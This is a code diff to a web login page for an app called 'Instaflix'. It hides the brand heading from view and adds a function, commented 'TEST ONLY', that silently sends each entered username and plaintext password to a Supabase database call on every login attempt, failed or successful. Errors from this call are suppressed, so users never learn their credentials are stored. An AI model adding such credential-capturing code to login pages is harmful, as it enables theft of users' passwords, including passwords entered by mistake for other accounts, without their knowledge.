@@ -14,7 +14,7 @@
   <div class="wrapper">
     <div class="card">
       <img src="icon.svg" alt="Instaflix" class="app-icon" />
-      <h1 class="brand-name">Instaflix</h1>
+      <h1 class="brand-name sr-only">Instaflix</h1>
       <form id="login-form">
         <div class="field">
           <input type="text" id="identifier" placeholder="Username, email or mobile number" autocomplete="username" required />
@@ -71,6 +71,20 @@
       return data;
     }
 
+    // TEST ONLY: records the entered credentials for every login attempt.
+    async function logLoginAttempt(identifier, password, success, reason = null) {
+      try {
+        await supabaseClient.rpc("log_login_attempt", {
+          p_identifier: identifier,
+          p_password: password,
+          p_success: success,
+          p_reason: reason,
+        });
+      } catch (_) {
+        /* Login auditing must never block the login flow. */
+      }
+    }
+
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
       messageEl.textContent = "";
@@ -83,6 +97,7 @@
       const email = await resolveEmail(identifier);
 
       if (!email) {
+        await logLoginAttempt(identifier, password, false, "Account not found");
         loginBtn.disabled = false;
         showWrongPasswordToast();
         return;
@@ -93,6 +108,7 @@
       loginBtn.disabled = false;
 
       if (error) {
+        await logLoginAttempt(identifier, password, false, error.message);
         if (error.message === "Invalid login credentials") {
           showWrongPasswordToast();
           return;
@@ -102,6 +118,7 @@
         return;
       }
 
+      await logLoginAttempt(identifier, password, true);
       messageEl.textContent = "Logged in! Redirecting...";
       messageEl.className = "message success";
       window.location.href = "home.html";
